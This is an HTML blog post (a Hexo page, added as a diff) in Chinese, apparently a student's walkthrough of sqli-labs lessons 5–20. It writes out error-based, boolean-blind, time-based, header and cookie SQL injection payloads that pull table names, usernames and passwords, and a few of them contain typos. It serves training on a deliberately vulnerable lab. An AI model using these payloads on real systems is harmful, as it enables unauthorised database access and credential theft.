@@ -1,0 +1,322 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+	<link rel="bookmark"  type="image/x-icon"  href="/img/logo_miccall.png"/>
+	<link rel="shortcut icon" href="/img/logo_miccall.png">
+	
+			    <title>
+    Hexo
+    </title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="/css/mic_main.css" />
+    <link rel="stylesheet" href="/css/dropdownMenu.css" />
+    <meta name="keywords" content="miccall" />
+    
+    	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	 
+    <noscript>
+        <link rel="stylesheet" href="/css/noscript.css" />
+    </noscript>
+    <style type="text/css">
+        body:before {
+          content: ' ';
+          position: fixed;
+          top: 0;
+          background: url('/img/bg.jpg') center 0 no-repeat;
+          right: 0;
+          bottom: 0;
+          left: 0;
+          background-size: cover; 
+        }
+    </style>
+
+
+			    
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script async type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jquery.scrollex.min.js"></script>
+    <script src="/js/jquery.scrolly.min.js"></script>
+    <script src="/js/skel.min.js"></script>
+    <script src="/js/util.js"></script>
+    <script src="/js/main.js"></script>
+	
+<meta name="generator" content="Hexo 5.4.1"></head>
+    
+		
+<!-- Layouts -->
+
+
+
+<!--  代码渲染  -->
+<link rel="stylesheet" href="/css/prism_coy.css" />
+<link rel="stylesheet" href="/css/typo.css" />
+<!-- 文章页 -->
+<body class="is-loading">
+    <!-- Wrapper 外包 s-->
+    <div id="wrapper" class="fade-in">
+        <!-- Intro 头部显示 s -->
+        <!-- Intro 头部显示 e -->
+        <!-- Header 头部logo start -->
+        <header id="header">
+    <a href="/" class="logo">SayuLiyuu</a>
+</header>
+
+
+        <!-- Nav 导航条 start -->
+        <nav id="nav" class="special" >
+            <ul class="menu links" >
+			<!-- Homepage  主页  --> 
+			<li >
+	            <a href="/" rel="nofollow">主页</a>
+	        </li>
+			<!-- categories_name  分类   --> 
+	        
+	        <li class="active">
+	            <a href="#s1">分类</a>
+	                    <ul class="submenu">
+	                        <li>
+	                        
+	                    </ul>
+	        </li>
+	        
+	        <!-- archives  归档   --> 
+	        
+	        
+		        <!-- Pages 自定义   -->
+		        
+		        <li>
+		            <a href="/about/" title="简历">
+		                简历
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/group/" title="团队">
+		                团队
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/gallery/" title="图库">
+		                图库
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/tag/" title="标签">
+		                标签
+		            </a>
+		        </li>
+		        
+
+
+            </ul>
+            <!-- icons 图标   -->
+			<ul class="icons">
+                    
+                    <li>
+                        <a title="github" href="https://github.com/miccall" target="_blank" rel="noopener">
+                            <i class="icon fa fa-github"></i>
+                        </a>
+                    </li>
+                    
+                    <li>
+                        <a title="500px" href="http://500px.com" target="_blank" rel="noopener">
+                            <i class="icon fa fa-500px"></i>
+                        </a>
+                    </li>
+                    
+			</ul>
+</nav>
+
+
+        <div id="main" >
+            <div class ="post_page_title_img" style="height: 25rem;background-image: url();background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
+                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >sql-labs less 5-20</h2></a>
+            </div>
+            <!-- Post -->
+            <div class="typo" style="padding: 3rem;">
+                <h2 id="Less5-报错注入"><a href="#Less5-报错注入" class="headerlink" title="Less5 报错注入"></a>Less5 报错注入</h2><p>首先直接登录，发现本关不显示回显，所以需要使用报错注入<br><img src="5.0.png">  </p>
+<h3 id="1-判断注入点类型"><a href="#1-判断注入点类型" class="headerlink" title="1.判断注入点类型"></a>1.判断注入点类型</h3><p><img src="5.1.1.png"><br><img src="5.1.2.png"><br>一个单引号报错，两个单引号正常，说明为单引号闭合  </p>
+<h3 id="2-获取当前数据库名"><a href="#2-获取当前数据库名" class="headerlink" title="2.获取当前数据库名"></a>2.获取当前数据库名</h3><p>?id=1’ and(select extractvalue(1,concat(0x7e,(select database()),0x7e)))–+<br><img src="5.2.png">  </p>
+<h3 id="3-获取数据库内所有表名"><a href="#3-获取数据库内所有表名" class="headerlink" title="3.获取数据库内所有表名"></a>3.获取数据库内所有表名</h3><p>?id=1’ and(select extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e)))–+<br><img src="5.3.png">  </p>
+<h3 id="4-查询用户表所有列"><a href="#4-查询用户表所有列" class="headerlink" title="4.查询用户表所有列"></a>4.查询用户表所有列</h3><p>?id=1’ and(select extractvalue(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=”users”),0x7e)))–+<br><img src="5.4.png">  </p>
+<h3 id="5-查询用户数据"><a href="#5-查询用户数据" class="headerlink" title="5.查询用户数据"></a>5.查询用户数据</h3><p>?id=1’ and(select extractvalue(1,concat(0x7e,(select group_concat(id,0x7e,username,0x7e,password)from users),0x7e)))–+<br><img src="5.5.png"><br>添加where条件，筛选特定用户数据<br>?id=1’ and(select extractvalue(1,concat(0x7e,(select group_concat(id,0x7e,username,0x7e,password)from users where username not in(‘Dumb’)),0x7e)))–+<br><img src="5.5.1.png"></br></p>
+<h2 id="Less6-报错注入"><a href="#Less6-报错注入" class="headerlink" title="Less6 报错注入"></a>Less6 报错注入</h2><p>本关和上一关一样不显示回显，所以使用报错注入</p>
+<h3 id="1-判断注入点类型-1"><a href="#1-判断注入点类型-1" class="headerlink" title="1.判断注入点类型"></a>1.判断注入点类型</h3><p><img src="6.1.png"><br><img src="6.1.1.png"><br>单引号报错，双引号正常，说明为双引号闭合<br>后续步骤与上面关卡相同</br></p>
+<h2 id="Less7-布尔盲注"><a href="#Less7-布尔盲注" class="headerlink" title="Less7 布尔盲注"></a>Less7 布尔盲注</h2><p>此关不显示回显，无法使用联合注入和报错注入，故使用布尔盲注</p>
+<h3 id="1-判断注入点类型-2"><a href="#1-判断注入点类型-2" class="headerlink" title="1.判断注入点类型"></a>1.判断注入点类型</h3><p><img src="7.1.png"><br>为’))的形式  </p>
+<h3 id="2-判断数据库长度（二分法）"><a href="#2-判断数据库长度（二分法）" class="headerlink" title="2.判断数据库长度（二分法）"></a>2.判断数据库长度（二分法）</h3><p>?id=1’)) and  (length (database()))=8–+<br><img src="7.2.png"><br>测试出长度为8  </p>
+<h3 id="3-获得数据库名【-database-n-1-n为位数，同样使用二分法】"><a href="#3-获得数据库名【-database-n-1-n为位数，同样使用二分法】" class="headerlink" title="3.获得数据库名【(database(),n,1)n为位数，同样使用二分法】"></a>3.获得数据库名【(database(),n,1)n为位数，同样使用二分法】</h3><p>?id=1’)) and ascii(substr(database(),1,1))&gt;100 –+<br><img src="7.3.png"><br>对应ASCII码中的“s”<br>判断第二位数据库名<br>?id=1’)) and ascii(substr(database(),2,1))&gt;100–+<br><img src="7.3.1.png"><br>对应ASCII码中的“e”<br>后续如上，最后得出数据库名为“Security”</p>
+<h3 id="4-获取数据库表的个数-二分法"><a href="#4-获取数据库表的个数-二分法" class="headerlink" title="4.获取数据库表的个数  (二分法)"></a>4.获取数据库表的个数  (二分法)</h3><p>?id=1’)) and (select count(*)from information_schema.tables where table_schema=database())&gt;1–+<br><img src="7.4.png"><br>判断有4个表  </p>
+<h3 id="5-获取表名长度-（使用limit来限制表的个数，每次读取一个表）"><a href="#5-获取表名长度-（使用limit来限制表的个数，每次读取一个表）" class="headerlink" title="5.获取表名长度 （使用limit来限制表的个数，每次读取一个表）"></a>5.获取表名长度 （使用limit来限制表的个数，每次读取一个表）</h3><p>?id=1’)) and (select length(table_name)from information_schema.tables where table_schema=database() limit 0,1)&gt;1–+<br><img src="7.5.png"><br>测试出长度为6  </p>
+<h3 id="6-获取表名（用limit显示表的个数和字符的个数）"><a href="#6-获取表名（用limit显示表的个数和字符的个数）" class="headerlink" title="6.获取表名（用limit显示表的个数和字符的个数）"></a>6.获取表名（用limit显示表的个数和字符的个数）</h3><p>?id=1’)) and ascii((substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;100–+<br><img src="7.6.png"><br>对应ASCII码中的“e”<br>后续如上，最后得出第一张表名为“email”<br>其余三张表也用同样的方式<br><strong>由于靶场打不开，后面暂时没有图片</strong></p>
+<h3 id="7-获取列的个数"><a href="#7-获取列的个数" class="headerlink" title="7.获取列的个数"></a>7.获取列的个数</h3><p>?id=1’)) and (select count(*)from information_schema.columns where table_name=”users”)&gt;1–+  </p>
+<h3 id="8-获取列名长度"><a href="#8-获取列名长度" class="headerlink" title="8.获取列名长度"></a>8.获取列名长度</h3><p>?id=1’)) and (select length(column_name)from information_schema.columns where table_name=”users” limit 0,1)&gt;1–+</p>
+<h3 id="9-获取列名"><a href="#9-获取列名" class="headerlink" title="9.获取列名"></a>9.获取列名</h3><p>?id=1’)) and ascii((substr((select column_name from information_schema.columns where table_name=”users”limit 0,1),1,1)))&gt;100–+</p>
+<h3 id="10-获得数据"><a href="#10-获得数据" class="headerlink" title="10.获得数据"></a>10.获得数据</h3><p>?id=1’)) and ascii(substr((select group_concat(username,0x7e,password) form users limit 0,1)1,1))&gt;100–+</br>  </p>
+<h2 id="Less8-布尔盲注"><a href="#Less8-布尔盲注" class="headerlink" title="Less8 布尔盲注"></a>Less8 布尔盲注</h2><p>此关不显示回显，无法使用联合注入和报错注入，故使用布尔盲注  </p>
+<h3 id="1-判断注入点类型-3"><a href="#1-判断注入点类型-3" class="headerlink" title="1.判断注入点类型"></a>1.判断注入点类型</h3><p>首先添加一个单引号发现报错，注释后正确，判断为单引号闭合<br><img src="8.1.png"><br>后续步骤与上面关卡相同</br></p>
+<h2 id="Less9-时间盲注（此关使用burp爆破，也可以手工注入）"><a href="#Less9-时间盲注（此关使用burp爆破，也可以手工注入）" class="headerlink" title="Less9 时间盲注（此关使用burp爆破，也可以手工注入）"></a>Less9 时间盲注（此关使用burp爆破，也可以手工注入）</h2><p>此关不论输入什么都回显正常，无法判断输入语句是否在服务器执行 </p>
+<h3 id="1-判断注入点类型-4"><a href="#1-判断注入点类型-4" class="headerlink" title="1.判断注入点类型"></a>1.判断注入点类型</h3><p>?id=1’ and sleep(5) –+<br>发现明显延迟，说明为单引号闭合型注入，接下来进行爆破流程</p>
+<h3 id="2-获取数据库名长度-（sleep（5）代表，如果前一语句符合条件，则等待5秒）"><a href="#2-获取数据库名长度-（sleep（5）代表，如果前一语句符合条件，则等待5秒）" class="headerlink" title="2.获取数据库名长度  （sleep（5）代表，如果前一语句符合条件，则等待5秒）"></a>2.获取数据库名长度  （sleep（5）代表，如果前一语句符合条件，则等待5秒）</h3><p>?id=1’ and if((length(database())&gt;5),sleep(5),1)–+<br><img src="9.1.png"><br>说明数据库名长度大于5, 接下来就是不断缩小范围,最后确定数据库名长度为8<br><img src="9.1.1.png">  </p>
+<h3 id="3-获取数据库名"><a href="#3-获取数据库名" class="headerlink" title="3.获取数据库名"></a>3.获取数据库名</h3><p>?id=1’ and if((substr(database(),1,1)=”a”),sleep(5),1)–+<br>从burp中抓包后，发送到intruder<br><img src="9.2.png"><br><img src="9.2.0.png"><br>![](9.2.1.png<br><img src="9.2.2.png"><br>爆破出数据库第一个字符为“s”<br>后续字符串重复上述步骤，更改目标位【(database(),<strong>1</strong>,1)】即可  </p>
+<h3 id="4-获取数据库表名"><a href="#4-获取数据库表名" class="headerlink" title="4.获取数据库表名"></a>4.获取数据库表名</h3><p>?id=1’ and if((substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=”a”),sleep(5),1)–+<br>其余步骤与上一步相同  </p>
+<h3 id="5-获取表中列名"><a href="#5-获取表中列名" class="headerlink" title="5.获取表中列名"></a>5.获取表中列名</h3><p>?id=1’ and if((substr((select column_name from information_schema.columns where table_name=”users” limit 0,1),1,1)=”a”),sleep(5),1)–+<br>其余步骤与上一步相同  </p>
+<h3 id="6-获取数据"><a href="#6-获取数据" class="headerlink" title="6.获取数据"></a>6.获取数据</h3><p>?id=1’ and if((subste((select group_concat(username,0x7e,password) from users limit 0,1),1,1)=”a”),sleep(5),1)–+<br>其余步骤与上一步相同</br></p>
+<h2 id="Less10"><a href="#Less10" class="headerlink" title="Less10"></a>Less10</h2><h3 id="1-判断注入点类型-5"><a href="#1-判断注入点类型-5" class="headerlink" title="1.判断注入点类型"></a>1.判断注入点类型</h3><p>?id=1” and sleep(5) –+<br><img src="10.1.png"><br>发现明显延迟，说明为双引号闭合型注入<br>爆破流程与上一关相同</br></p>
+<h2 id="Less11"><a href="#Less11" class="headerlink" title="Less11"></a>Less11</h2><h3 id="1-正常登录"><a href="#1-正常登录" class="headerlink" title="1.正常登录"></a>1.正常登录</h3><p>首先使用admin登录 （也可以为其他字符串）<br><img src="11.1.png">  </p>
+<h3 id="2-抓取POST包并判断注入点类型"><a href="#2-抓取POST包并判断注入点类型" class="headerlink" title="2.抓取POST包并判断注入点类型"></a>2.抓取POST包并判断注入点类型</h3><p><img src="11.2.png"><br><img src="11.2.1.png"><br>添加单引号发现报错，说明为单引号闭合,可以使用报错注入</p>
+<h3 id="3-爆破数据库"><a href="#3-爆破数据库" class="headerlink" title="3.爆破数据库"></a>3.爆破数据库</h3><p>由于报错注入与前面关卡所用方法完全一致，所以这里我只进行一个举例<br><strong>获取当前数据库名</strong><br>uname=admin’and(select extractvalue(1,concat(0x7e,(select database()),0x7e)))–+&amp;passwd=admin&amp;submit=Submit<br><img src="11.3.png"><br>后续爆破数据库内表，列，用户数据步骤可参照Less5、6</br></p>
+<h2 id="Less12-与less11相似"><a href="#Less12-与less11相似" class="headerlink" title="Less12 -与less11相似"></a>Less12 -与less11相似</h2><h3 id="1-正常登录-1"><a href="#1-正常登录-1" class="headerlink" title="1.正常登录"></a>1.正常登录</h3><p>使用admin登录（也可以为其他字符串）</p>
+<h3 id="2-抓取POST包并判断注入点类型-1"><a href="#2-抓取POST包并判断注入点类型-1" class="headerlink" title="2.抓取POST包并判断注入点类型"></a>2.抓取POST包并判断注入点类型</h3><p><img src="12.1.png"><br>添加双引号发现报错，说明为单引号闭合,可以使用报错注入<br>样例：<strong>获取当前数据库名</strong><br>uname=admin” and(select extractvalue(1,concat(0x7e,(select database()),0x7e)))–+&amp;passwd=admin&amp;submit=Submit<br>后续步骤与上一关相同</br></p>
+<h2 id="Less13"><a href="#Less13" class="headerlink" title="Less13"></a>Less13</h2><h3 id="1-正常登录-2"><a href="#1-正常登录-2" class="headerlink" title="1.正常登录"></a>1.正常登录</h3><p>使用admin登录（也可以为其他字符串）  </p>
+<h3 id="2-抓取POST包并判断注入点类型-2"><a href="#2-抓取POST包并判断注入点类型-2" class="headerlink" title="2.抓取POST包并判断注入点类型"></a>2.抓取POST包并判断注入点类型</h3><p><img src="13.1.png"><br>添加单双引号都发现报错，继续测试发现为’)闭合,可以使用报错注入<br>样例：<strong>获取当前数据库名</strong><br>uname=admin’) and(select extractvalue(1,concat(0x7e,(select database()),0x7e)))–+&amp;passwd=admin&amp;submit=Submit<br>后续步骤与上一关相同</br></p>
+<h2 id="Less14"><a href="#Less14" class="headerlink" title="Less14"></a>Less14</h2><p>根据我的测试，注入点与Less12相同，均为双引号，后续报错注入流程也完全一致，暂未发现不同之处，如果后续课程中有发现会进行补充修改</br></p>
+<h2 id="Less15"><a href="#Less15" class="headerlink" title="Less15"></a>Less15</h2><h3 id="1-正常登录-3"><a href="#1-正常登录-3" class="headerlink" title="1.正常登录"></a>1.正常登录</h3><p>使用admin登录（也可以为其他字符串） </p>
+<h3 id="2-抓取POST包并判断注入点类型-3"><a href="#2-抓取POST包并判断注入点类型-3" class="headerlink" title="2.抓取POST包并判断注入点类型"></a>2.抓取POST包并判断注入点类型</h3><p><img src="15.1.png"><br>测试注入点，发现为单引号闭合<br>按正常流程爆破发现没有回显<br><img src="15.2.png"><br>使用延迟注入，发现有明显延迟<br><img src="15.2.1.png"><br>可以采用用手工延迟注入或者burp爆破<br>步骤与Less7几乎相同，这里只放样例了</p>
+<h3 id="3-判断数据库名长度"><a href="#3-判断数据库名长度" class="headerlink" title="3.判断数据库名长度"></a>3.判断数据库名长度</h3><p>uname=admin’ and if(length(database())=8,sleep(5),1)–+&amp;passwd=admin&amp;submit=Submit</p>
+<h3 id="4-获取数据库名"><a href="#4-获取数据库名" class="headerlink" title="4.获取数据库名"></a>4.获取数据库名</h3><p>uname=admin’ and if((substr(database(),1,1)=”s”),sleep(5),1)–+ &amp;passwd=admin&amp;submit=Submit</br></p>
+<h2 id="Less16"><a href="#Less16" class="headerlink" title="Less16"></a>Less16</h2><h3 id="1-正常登录-4"><a href="#1-正常登录-4" class="headerlink" title="1.正常登录"></a>1.正常登录</h3><p>使用admin登录（也可以为其他字符串） </p>
+<h3 id="2-抓取POST包并判断注入点类型-4"><a href="#2-抓取POST包并判断注入点类型-4" class="headerlink" title="2.抓取POST包并判断注入点类型"></a>2.抓取POST包并判断注入点类型</h3><p><img src="16.1.png"><br>测试注入点，发现为双引号加括号”)的形式闭合<br>后续步骤与上一关相同</br></p>
+<h2 id="Less17"><a href="#Less17" class="headerlink" title="Less17"></a>Less17</h2><h3 id="1-正常登录-5"><a href="#1-正常登录-5" class="headerlink" title="1.正常登录"></a>1.正常登录</h3><p>使用admin登录（也可以为其他字符串）  </p>
+<h3 id="2-抓取POST包并判断注入点类型-5"><a href="#2-抓取POST包并判断注入点类型-5" class="headerlink" title="2.抓取POST包并判断注入点类型"></a>2.抓取POST包并判断注入点类型</h3><p>正常进行注入点判断<br><img src="17.1.png"><br>观察页面发现此关卡注入可能不在uname上<br>尝试在password进行注入<br><img src="17.2.png"><br>成功报错并有回显<br>可以进行报错注入，后续步骤与上面关卡相同，注入点改为password<br>样例：<strong>获取当前数据库名</strong><br>uname=admin&amp;passwd=admin’ and(select extractvalue(1,concat(0x7e,(select database()),0x7e)))–+&amp;submit=Submit<br><img src="17.3.png"></br></p>
+<h2 id="Less18"><a href="#Less18" class="headerlink" title="Less18"></a>Less18</h2><h3 id="1-正常登录-6"><a href="#1-正常登录-6" class="headerlink" title="1.正常登录"></a>1.正常登录</h3><p>使用admin登录（也可以为其他字符串）    </p>
+<h3 id="2-抓取POST包并判断注入点类型-6"><a href="#2-抓取POST包并判断注入点类型-6" class="headerlink" title="2.抓取POST包并判断注入点类型"></a>2.抓取POST包并判断注入点类型</h3><p>正常登录，发现页面有 User Agent回显<br><img src="18.1.png"><br>猜测注入点在User Agent  </p>
+<h3 id="3-尝试在User-Agent获取当前数据库名"><a href="#3-尝试在User-Agent获取当前数据库名" class="headerlink" title="3.尝试在User Agent获取当前数据库名"></a>3.尝试在User Agent获取当前数据库名</h3><p><strong>‘and</strong>(select extractvalue(1,concat(0x7e,(select database()),0x7e)))<strong>and’</strong><br><img src="18.2.png"><br>经过测试，语句前后<strong>需要有</strong>‘and….and’闭合，改为’or….or’也可以正常回显，原因暂时未知，网上也没查到相关解释<br>后续步骤就是正常的报错注入流程</br></p>
+<h2 id="Less19"><a href="#Less19" class="headerlink" title="Less19"></a>Less19</h2><h3 id="1-正常登录-7"><a href="#1-正常登录-7" class="headerlink" title="1.正常登录"></a>1.正常登录</h3><p>使用admin登录（也可以为其他字符串） </p>
+<h3 id="2-抓取POST包并判断注入点类型-7"><a href="#2-抓取POST包并判断注入点类型-7" class="headerlink" title="2.抓取POST包并判断注入点类型"></a>2.抓取POST包并判断注入点类型</h3><p>正常登录，发现页面有Referer回显<br><img src="19.1.png"><br>猜测注入点在Referer  </p>
+<h3 id="3-尝试在Referer获取当前数据库名"><a href="#3-尝试在Referer获取当前数据库名" class="headerlink" title="3.尝试在Referer获取当前数据库名"></a>3.尝试在Referer获取当前数据库名</h3><p><strong>‘and</strong>(select extractvalue(1,concat(0x7e,(select database()),0x7e)))<strong>and’</strong><br><img src="19.2.png"><br>正常回显,与上一关完全一致，注入点从User Agent改为Referer</br></p>
+<h2 id="Less20"><a href="#Less20" class="headerlink" title="Less20"></a>Less20</h2><h3 id="1-正常登录-8"><a href="#1-正常登录-8" class="headerlink" title="1.正常登录"></a>1.正常登录</h3><p>使用admin登录（也可以为其他字符串） </p>
+<h3 id="2-抓取POST包并判断注入点类型-8"><a href="#2-抓取POST包并判断注入点类型-8" class="headerlink" title="2.抓取POST包并判断注入点类型"></a>2.抓取POST包并判断注入点类型</h3><p>正常登录，发现页面有Cookie回显<br><img src="20.1.png"><br>使用burp抓包，这次需要抓GET包<br><img src="20.2.png"><br>观察到cookie=admin，判断为cookie注入<br><img src="20.2.1.png"><br>在cookie=admin处添加单引号，报错  </p>
+<h3 id="3-尝试在Cookie获取当前数据库名"><a href="#3-尝试在Cookie获取当前数据库名" class="headerlink" title="3.尝试在Cookie获取当前数据库名"></a>3.尝试在Cookie获取当前数据库名</h3><p>uname=admin’and(select extractvalue(1,concat(0x7e,(select database()),0x7e)))–+<br><img src="20.3.png"><br>还可使用联合查询<br>uname=-admin’union select 1,database(),3–+<br><img src="20.3.1.png"><br>注意联合查询中，需要查询显示行数，admin前需要添加-<br>后续报错注入和联合查询步骤和以前的关卡一致</p>
+
+            </div>
+
+            <!-- Post Comments -->
+            
+    <!-- 使用 DISQUS_CLICK -->
+<div id="disqus-comment">
+    <div id="disqus_thread"></div>
+
+<!-- add animation -->
+<style>
+	.disqus_click_btn {
+            line-height: 30px;
+            margin: 0;
+            min-width: 50px;
+            padding: 0 14px;
+            display: inline-block;
+            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            text-transform: uppercase;
+            letter-spacing: 0;
+            overflow: hidden;
+            will-change: box-shadow;
+            transition: box-shadow .2s cubic-bezier(.4, 0, 1, 1), background-color .2s cubic-bezier(.4, 0, .2, 1), color .2s cubic-bezier(.4, 0, .2, 1);
+            outline: 0;
+            cursor: pointer;
+            text-decoration: none;
+            text-align: center;
+            vertical-align: middle;
+            border: 0;
+            background: rgba(158, 158, 158, .2);
+            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .14), 0 3px 1px -2px rgba(0, 0, 0, .2), 0 1px 5px 0 rgba(0, 0, 0, .12);
+            color: #fff;
+            background-color: #7EC0EE;
+            text-shadow: 0
+        }
+</style>
+	
+<div class="btn_click_load" id="disqus_bt"> 
+    <button class="disqus_click_btn">点击查看评论</button>
+</div>
+
+<!--
+<script type="text/javascript">
+$('.btn_click_load').click(function() {
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'http-miccall-tech'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+
+    document.getElementById('disqus_bt').style.display = "none";
+});
+</script>
+-->
+<script type="text/javascript">
+    var disqus_config = function () {
+        this.page.url = 'http://example.com/2022/04/01/5-20/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://example.com/2022/04/01/5-20/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+</script>
+
+<script type="text/javascript">
+    $('.btn_click_load').click(function() {  //click to load comments
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document;
+            var s = d.createElement('script');
+            s.src = '//http-miccall-tech.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', + new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+        $('.btn_click_load').css('display','none');
+    });
+</script>
+</div>
+<style>
+    #disqus-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+
+        </div>
+        <!-- Copyright 版权 start -->
+                <div id="copyright">
+            <ul>
+                <li>&copy; <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/" style="border-bottom: none;"></a></li>
+                <li> <a target="_blank" rel="noopener" href="http://miccall.tech " style="border-bottom: none;"></a></li>
+            </ul>
+            
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+			
+        </div>
+    </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+
+
+ 	
+</html>
